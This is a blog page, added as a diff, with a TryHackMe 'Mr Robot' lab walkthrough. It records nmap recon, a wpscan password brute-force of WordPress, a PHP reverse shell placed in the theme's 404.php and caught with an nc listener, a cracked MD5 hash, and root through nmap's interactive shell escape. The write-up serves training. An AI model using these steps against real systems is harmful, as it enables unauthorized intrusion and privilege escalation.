@@ -1,0 +1,667 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crazyinside">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="123456789101112131415161718Starting Nmap 7.92SVN ( https:&#x2F;&#x2F;parrot.org ) at 2022-07-29 21:55 CSTNmap scan report for 10.10.194.101Host is up (0.39s latency).PORT    STATE SERVICE  VERSION80&#x2F;tcp  open">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tryhackme-Mr robot">
+<meta property="og:url" content="http://example.com/2022/10/06/Tryhackme-Mr-robot/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="123456789101112131415161718Starting Nmap 7.92SVN ( https:&#x2F;&#x2F;parrot.org ) at 2022-07-29 21:55 CSTNmap scan report for 10.10.194.101Host is up (0.39s latency).PORT    STATE SERVICE  VERSION80&#x2F;tcp  open">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220729220508382.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220729223932071.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220729224654964.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.881Z">
+<meta property="article:modified_time" content="2022-07-30T02:04:58.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220729220508382.png">
+  
+  
+  
+  <title>Tryhackme-Mr robot - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Tryhackme-Mr robot"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Tryhackme-Mr robot</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.92SVN ( https://parrot.org ) at 2022-07-29 21:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.194.101<br>Host is up (0.39s latency).<br><br>PORT    STATE SERVICE  VERSION<br>80/tcp  open  http     Apache httpd<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache</span><br><span class="hljs-string">443/tcp open  ssl/http Apache httpd</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=www.example.com</span><br><span class="hljs-string">| Not valid before: 2015-09-16T10:45:03</span><br><span class="hljs-string">|_Not valid after:  2025-09-13T10:45:03</span><br><span class="hljs-string">|_http-server-header: Apache</span><br><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (text/html).<br><br>Service detection performed. Please report any incorrect results at https://parrot.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 29.75 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV -p80,443 10.10.194.101                                          <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://10.10.194.101/robots.txt    <br>User-agent: *<br>fsocity.dic<br>key-1-of-3.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220729220508382.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220729220508382"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs BASH">Crazy:~/mrboot$ wpscan --url http://10.10.194.101/wp-login.php --usernames Elliot --passwords fsocity.dic — max-threads 50<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.22</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://10.10.194.101/wp-login.php/ [10.10.194.101]</span><br><span class="hljs-string">[+] Started: Fri Jul 29 22:22:19 2022</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="hljs-string">Trying Elliot / ER28-0652 Time: 00:00:00 &lt;===============================&gt; (1 / 1) 100.00% Time: 00:00:00</span><br><span class="hljs-string">Trying Elliot / ER28-0652 Time: 00:00:00 &lt;================                &gt; (1 / 2) 50.00%  ETA: ??:??:??</span><br><span class="hljs-string">[SUCCESS] - Elliot / ER28-0652                                                                           </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] Valid Combinations Found:</span><br><span class="hljs-string"> | Username: Elliot, Password: ER28-0652</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Fri Jul 29 22:31:28 2022</span><br><span class="hljs-string">[+] Requests Done: 140</span><br><span class="hljs-string">[+] Cached Requests: 185</span><br><span class="hljs-string">[+] Data Sent: 38.701 KB</span><br><span class="hljs-string">[+] Data Received: 57.079 KB</span><br><span class="hljs-string">[+] Memory used: 213.281 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:14</span><br><span class="hljs-string">                                                                                                         </span><br><span class="hljs-string">Crazy:~/mrboot$ </span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220729223932071.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220729223932071"></p>
+<p>粘贴PHP反向shell代码：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://10.10.194.101/wordpress/wp-content/themes/twentyfifteen/404.php<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/mrboot$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.11.75.230] from (UNKNOWN) [10.10.194.101] 34761<br>Linux linux 3.13.0-55-generic <span class="hljs-comment">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span><br> 14:42:41 up 49 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.02, 0.27<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=1(daemon) gid=1(daemon) <span class="hljs-built_in">groups</span>=1(daemon)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ script -qc /bin/bash /dev/null</span><br><span class="hljs-string">daemon@linux:/$ ls</span><br><span class="hljs-string">bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var</span><br><span class="hljs-string">boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz</span><br><span class="hljs-string">daemon@linux:/$ ls -all</span><br><span class="hljs-string">total 84</span><br><span class="hljs-string">drwxr-xr-x  22 root root  4096 Sep 16  2015 .</span><br><span class="hljs-string">drwxr-xr-x  22 root root  4096 Sep 16  2015 ..</span><br><span class="hljs-string">drwxr-xr-x   2 root root  4096 Sep 16  2015 bin</span><br><span class="hljs-string">drwxr-xr-x   3 root root  4096 Oct  3  2018 boot</span><br><span class="hljs-string">drwxr-xr-x  13 root root  3820 Jul 29 13:52 dev</span><br><span class="hljs-string">drwxr-xr-x  77 root root  4096 Jul 29 13:53 etc</span><br><span class="hljs-string">drwxr-xr-x   3 root root  4096 Nov 13  2015 home</span><br><span class="hljs-string">lrwxrwxrwx   1 root root    33 Jun 24  2015 initrd.img -&gt; boot/initrd.img-3.13.0-55-generic</span><br><span class="hljs-string">drwxr-xr-x  16 root root  4096 Jun 24  2015 lib</span><br><span class="hljs-string">drwxr-xr-x   2 root root  4096 Jun 24  2015 lib64</span><br><span class="hljs-string">drwx------   2 root root 16384 Jun 24  2015 lost+found</span><br><span class="hljs-string">drwxr-xr-x   2 root root  4096 Jun 24  2015 media</span><br><span class="hljs-string">drwxr-xr-x   4 root root  4096 Nov 13  2015 mnt</span><br><span class="hljs-string">drwxr-xr-x   3 root root  4096 Sep 16  2015 opt</span><br><span class="hljs-string">dr-xr-xr-x 125 root root     0 Jul 29 13:52 proc</span><br><span class="hljs-string">drwx------   3 root root  4096 Nov 13  2015 root</span><br><span class="hljs-string">drwxr-xr-x  14 root root   480 Jul 29 13:54 run</span><br><span class="hljs-string">drwxr-xr-x   2 root root  4096 Nov 13  2015 sbin</span><br><span class="hljs-string">drwxr-xr-x   3 root root  4096 Jun 24  2015 srv</span><br><span class="hljs-string">dr-xr-xr-x  13 root root     0 Jul 29 13:52 sys</span><br><span class="hljs-string">drwxrwxrwt   4 root root  4096 Jul 29 13:54 tmp</span><br><span class="hljs-string">drwxr-xr-x  10 root root  4096 Jun 24  2015 usr</span><br><span class="hljs-string">drwxr-xr-x  11 root root  4096 Jun 24  2015 var</span><br><span class="hljs-string">lrwxrwxrwx   1 root root    30 Jun 24  2015 vmlinuz -&gt; boot/vmlinuz-3.13.0-55-generic</span><br><span class="hljs-string">daemon@linux:/$ cd home </span><br><span class="hljs-string">daemon@linux:/home$ ls</span><br><span class="hljs-string">robot</span><br><span class="hljs-string">daemon@linux:/home$ cd robot</span><br><span class="hljs-string">daemon@linux:/home/robot$ ls</span><br><span class="hljs-string">key-2-of-3.txt  password.raw-md5</span><br><span class="hljs-string">daemon@linux:/home/robot$ cat password.raw-md5</span><br><span class="hljs-string">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220729224654964.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220729224654964"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">daemon@linux:~$ <span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">cd</span> /home<br>daemon@linux:/home$ su robot<br>su robot<br>Password: abcdefghijklmnopqrstuvwxyz      <br><br>robot@linux:/home$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">robot@linux:~$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/bin/ping<br>/bin/umount<br>/bin/mount<br>/bin/ping6<br>/bin/su<br>/usr/bin/passwd<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/gpasswd<br>/usr/bin/sudo<br>/usr/local/bin/nmap<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>/usr/lib/pt_chown<br></code></pre></td></tr></table></figure>
+
+<p>或许可以尝试nmap提权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">robot@linux:~$ nmap --interactive<br>nmap --interactive<br><br>Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )<br>Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span><br>nmap&gt; !/bin/sh<br>!/bin/sh<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=1002(robot) gid=1002(robot) euid=0(root) <span class="hljs-built_in">groups</span>=0(root),1002(robot)<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Tryhackme-Mr robot</div>
+      <div>http://example.com/2022/10/06/Tryhackme-Mr-robot/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-VulnNet%20Active/" title="TryHackMe-VulnNet Active">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">TryHackMe-VulnNet Active</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/Tryhackme-Overpass-2---Hacked/" title="Tryhackme-Overpass 2 - Hacked">
+                        <span class="hidden-mobile">Tryhackme-Overpass 2 - Hacked</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
